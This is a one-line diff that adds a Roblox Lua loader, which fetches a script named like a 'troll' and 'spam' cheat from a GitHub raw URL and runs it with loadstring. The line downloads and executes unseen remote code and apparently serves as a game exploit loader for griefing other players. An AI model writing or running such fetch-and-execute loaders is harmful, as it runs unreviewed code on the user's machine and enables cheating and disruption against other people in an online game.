@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/troll-hug-tower-spam6-ua0n17ozo459yj.lua"))()
